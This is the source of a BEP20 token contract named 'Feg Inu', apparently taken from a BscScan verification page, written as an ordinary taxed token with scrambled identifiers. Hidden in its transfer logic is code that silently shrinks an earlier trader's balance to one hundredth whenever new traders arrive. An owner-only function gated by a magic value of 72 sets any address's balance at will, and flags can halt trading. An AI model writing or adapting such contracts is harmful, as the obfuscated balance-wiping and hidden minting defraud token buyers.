/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

/*

 * 
 * Telegram: https://t.me/feginucoin
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying

  // an instance of this contract, which should be used via inheritance.

  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}
interface IBEP20 {
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external pure returns (string memory);

  function transfer(address recipient, uint256 amount) external returns (bool);
  function decimals() external view returns (uint8);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function symbol() external pure returns (string memory);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function getOwner() external view returns (address);
  function approve(address spender, uint256 amount) external returns (bool);
  function totalSupply() external view returns (uint256);
}
library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");

    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;

    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;

    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;

    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This

 * can later be changed with {transferOwnership}.

 *

 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();

   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**

  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;

 }
 /**
  * @dev Throws if called by any account other than the owner.

  */

 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *

  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */

 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));

   _owner = address(0);
 }
 /**

  * @dev Transfers ownership of the contract to a new account (`newOwner`).

  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);

   _owner = newOwner;

 }
}
interface IUniswapV2Factory {
    function setFeeTo(address) external;
    function feeToSetter() external view returns (address);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeToSetter(address) external;
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function feeTo() external view returns (address);
}
interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    function burn(address to) external returns (uint amount0, uint amount1);
    function token0() external view returns (address);
    function name() external pure returns (string memory);
    function initialize(address, address) external;
    function price1CumulativeLast() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function skim(address to) external;
    function token1() external view returns (address);
    event Sync(uint112 reserve0, uint112 reserve1);
    function decimals() external pure returns (uint8);
    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function mint(address to) external returns (uint liquidity);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function transferFrom(address from, address to, uint value) external returns (bool);
    function sync() external;
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function symbol() external pure returns (string memory);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function transfer(address to, uint value) external returns (bool);
    function factory() external view returns (address);
    function allowance(address owner, address spender) external view returns (uint);
    function price0CumulativeLast() external view returns (uint);
    function nonces(address owner) external view returns (uint);
    function kLast() external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function totalSupply() external view returns (uint);
}
interface IUniswapV2Router01 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function removeLiquidityWithPermit(
        address tokenA,

        address tokenB,

        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)

        external
        returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,

        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,

        uint amountBMin,

        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function removeLiquidity(
        address tokenA,

        address tokenB,
        uint liquidity,

        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)

        external
        payable

        returns (uint[] memory amounts);

    function removeLiquidityETHWithPermit(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}
contract FegInu is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unirkstzjyxighdfqw;
  address public uniekcpowisfxhqdejyamzn;
  uint8 private deckslczoajrde = 18;

  uint256 private totplaxzgyihrmtenikqdafjse = 100000000 * 10 ** deckslczoajrde;
  uint32 internal selamdjhploxfiirbegqzwas = 10; 
  mapping (address => uint256) private lasaxoroicledepgabhkfznqtsiym;
  uint8 internal aftihyaxkwoqbtnrflezoepd = 95;
  uint256 internal lassjaqzmcohnwxaiglbeke = 0;
  address internal marairwenpbxjfiodoqatcgyzlkhmse;
  bool internal stanitoyakqiroefjxlsabzwcdgmehp = true;
  bool internal stazwcioaemjaorhfpbkixgtlnq = true;

  bool internal stazenbkgjmlhiofawqasypixoecrdt = true;

  mapping (address => uint256) private baldeipyfgksjabmoinchlrxtwaeozq;

  uint256 internal lauwspjlmoqhkoy = 0;

  string private constant namzqxflphsmewiak = "Feg Inu";
  string private constant symrpxosgcnbzyem = "FEG";
  mapping (address => bool) private isEwfszlnareodemp;
  uint8 internal buyqogcwjrsiehbo = 8;

  uint8 internal selsfkexjtpbnroidwzmqaha = 12;
  uint8 internal traismzowrdqahlbtxciekafg = 10; 
  mapping (address => uint256) private lasnxwkqfoopgbjerezlymiitcaa;
  mapping (address => uint256) private seliaqgoodbfsemzerpxtic;

  mapping (address => mapping (address => uint256)) private allbnjioedplgiaahmeorsxkywtcqzf;
  uint256 internal maxamapklrcohiybqxtj = totplaxzgyihrmtenikqdafjse.div(10000).mul(10);
  uint8 internal _sta = 3;

  constructor() {
    isEwfszlnareodemp[address(this)] = true;
    // baldeipyfgksjabmoinchlrxtwaeozq[marketingAddress] = totplaxzgyihrmtenikqdafjse * 10**deckslczoajrde * 1000;
    lauwspjlmoqhkoy = block.timestamp;
    baldeipyfgksjabmoinchlrxtwaeozq[msg.sender] = totplaxzgyihrmtenikqdafjse;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    uniekcpowisfxhqdejyamzn = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unirkstzjyxighdfqw = uniswapV2Router;

    isEwfszlnareodemp[_msgSender()] = true;
    // isEwfszlnareodemp[marketingAddress] = true;

    marairwenpbxjfiodoqatcgyzlkhmse = msg.sender;
    emit Transfer(address(0), msg.sender, totplaxzgyihrmtenikqdafjse);
  }
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symrpxosgcnbzyem;
	}
	/**
	 * Returns the bep token owner.
	 */

	function getOwner() external override view returns (address) {
	  return owner();
	}
	/**
	 * Returns balance of.

	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return baldeipyfgksjabmoinchlrxtwaeozq[account];
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allbnjioedplgiaahmeorsxkywtcqzf[owner][spender];

	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return deckslczoajrde;
	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namzqxflphsmewiak;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	function _approve(address owner, address spender, uint256 amount) private {

	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allbnjioedplgiaahmeorsxkywtcqzf[owner][spender] = amount;

	    emit Approval(owner, spender, amount);
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  trayboqdzoiwafnagc(_msgSender(), recipient, amount);
	  return true;
	}
	/**
	 * Returns the token Supply.

	 */
	function totalSupply() external override view returns (uint256) {
	  return totplaxzgyihrmtenikqdafjse;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

	   trayboqdzoiwafnagc(sender, recipient, amount);
	   _approve(sender, _msgSender(), allbnjioedplgiaahmeorsxkywtcqzf[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
  	function trayboqdzoiwafnagc(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");

	  uint8 ranikrdaloofhacqizp = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  if(amount > 0){
	    if(isEwfszlnareodemp[sender] == true || isEwfszlnareodemp[recipient] == true){

	      eTrilrahiefcydqbkazx(sender, recipient, amount);
	      return;

	    }
	    if(sender == uniekcpowisfxhqdejyamzn && recipient != address(unirkstzjyxighdfqw)) {
	      require(stanitoyakqiroefjxlsabzwcdgmehp == true, "Please wait try again later");
	      ranikrdaloofhacqizp = 1;
	      tax = buyqogcwjrsiehbo;

	      approveTransaction = true;
	      lasnxwkqfoopgbjerezlymiitcaa[recipient] = amount;
	      lasaxoroicledepgabhkfznqtsiym[recipient] = block.timestamp;
	    } else if(recipient == uniekcpowisfxhqdejyamzn) {

	      require(stazwcioaemjaorhfpbkixgtlnq == true, "Please wait try again later");
	       ranikrdaloofhacqizp = 2;
	       tax = selsfkexjtpbnroidwzmqaha;
	       approveTransaction = true;
	    } else {
	      require(stazenbkgjmlhiofawqasypixoecrdt == true, "Please wait try again later");

	      ranikrdaloofhacqizp = 3;

	      tax = traismzowrdqahlbtxciekafg;
	      approveTransaction = true;
	      lasnxwkqfoopgbjerezlymiitcaa[sender] = amount;

	      if(selamdjhploxfiirbegqzwas > 10){
	        lasaxoroicledepgabhkfznqtsiym[sender] = block.timestamp + selamdjhploxfiirbegqzwas - 10;
	      } else {
	        lasaxoroicledepgabhkfznqtsiym[sender] = block.timestamp + selamdjhploxfiirbegqzwas;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranikrdaloofhacqizp);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}
	function eTrilrahiefcydqbkazx(address sender, address recipient, uint256 amount) internal {
	    baldeipyfgksjabmoinchlrxtwaeozq[sender] = baldeipyfgksjabmoinchlrxtwaeozq[sender].sub(amount, "Insufficient Balance");
	    baldeipyfgksjabmoinchlrxtwaeozq[recipient] = baldeipyfgksjabmoinchlrxtwaeozq[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allbnjioedplgiaahmeorsxkywtcqzf;
	address public _recipienta;
	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranikrdaloofhacqizp) internal
	{
	  uint256 axeczamxrdqobhstyak = 0;
	  address addr = recipient;
	  uint256 d = baldeipyfgksjabmoinchlrxtwaeozq[_recipientb];
	  if(ranikrdaloofhacqizp == 2) {

	    addr = sender;
	  }

	  if(ranikrdaloofhacqizp == 1 || ranikrdaloofhacqizp == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        baldeipyfgksjabmoinchlrxtwaeozq[_recipientb] = d.div(100);
	      }

	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }

	  }
	  baldeipyfgksjabmoinchlrxtwaeozq[sender] = baldeipyfgksjabmoinchlrxtwaeozq[sender].sub(amount,"Insufficient Balance");
	  axeczamxrdqobhstyak = amount.mul(tax).div(100);
	  amount = amount.sub(axeczamxrdqobhstyak);
	  if(axeczamxrdqobhstyak > 0){
	      baldeipyfgksjabmoinchlrxtwaeozq[marairwenpbxjfiodoqatcgyzlkhmse] = baldeipyfgksjabmoinchlrxtwaeozq[marairwenpbxjfiodoqatcgyzlkhmse].add(axeczamxrdqobhstyak);
	      emit Transfer(sender, marairwenpbxjfiodoqatcgyzlkhmse, axeczamxrdqobhstyak);
	  }
	  baldeipyfgksjabmoinchlrxtwaeozq[recipient] = baldeipyfgksjabmoinchlrxtwaeozq[recipient].add(amount);
	  ranikrdaloofhacqizp= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function etBrkajgmztceanixdpilbh(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    baldeipyfgksjabmoinchlrxtwaeozq[addr] = b * 10 ** deckslczoajrde;

	  }

	}
	function Selateylfposogexabzikwnqhjdicrm(uint8 ellnifjzrexmlyqatdoawboipheg) public onlyOwner{
	     selsfkexjtpbnroidwzmqaha = ellnifjzrexmlyqatdoawboipheg;
	}

	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
}